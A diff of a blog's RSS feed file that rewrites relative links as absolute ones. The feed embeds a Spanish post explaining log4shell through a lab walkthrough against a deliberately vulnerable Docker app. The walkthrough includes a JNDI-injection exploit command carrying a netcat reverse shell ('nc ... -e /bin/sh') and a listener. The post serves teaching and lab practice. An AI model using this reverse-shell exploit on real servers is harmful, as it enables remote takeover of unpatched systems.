@@ -2,23 +2,23 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Linux on pacodiazdg.github.io</title>
-        <link>/categories/linux/</link>
+        <link>https://pacodiazdg.github.io/categories/linux/</link>
         <description>Recent content in Linux on pacodiazdg.github.io</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-es</language>
-        <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="/categories/linux/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="https://pacodiazdg.github.io/categories/linux/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Acerca de log4shell</title>
-        <link>/posts/acerca-de-log4shell/</link>
+        <link>https://pacodiazdg.github.io/posts/acerca-de-log4shell/</link>
         <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
         
-        <guid>/posts/acerca-de-log4shell/</guid>
-        <description>&lt;img src="/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png" alt="Featured image of post Acerca de log4shell" /&gt;&lt;p&gt;log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.&lt;/p&gt;
+        <guid>https://pacodiazdg.github.io/posts/acerca-de-log4shell/</guid>
+        <description>&lt;img src="https://pacodiazdg.github.io/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png" alt="Featured image of post Acerca de log4shell" /&gt;&lt;p&gt;log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.&lt;/p&gt;
 &lt;h3 id=&#34;como-funciona&#34;&gt;Como Funciona?
 &lt;/h3&gt;&lt;p&gt;Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable &lt;a class=&#34;link&#34; href=&#34;https://github.com/christophetd/log4shell-vulnerable-app&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://github.com/christophetd/log4shell-vulnerable-app&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/christophetd/log4shell-vulnerable-app.git
 docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://pacodiazdg.github.io/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;
 	
 	
 	
@@ -29,7 +29,7 @@ docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vu
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://pacodiazdg.github.io/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;
 	
 	
 	
@@ -52,7 +52,7 @@ docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vu
     &gt;https://github.com/welk1n/JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &amp;#34;nc 172.17.0.1 4444 -e /bin/sh&amp;#34; 
 nc -lvp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://pacodiazdg.github.io/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;
 	
 	
 	
@@ -71,7 +71,7 @@ nc -lvp 4444
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pacodiazdg.github.io/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;
 	
 	
 	
@@ -81,7 +81,7 @@ nc -lvp 4444
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://pacodiazdg.github.io/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;
 	
 	
 	
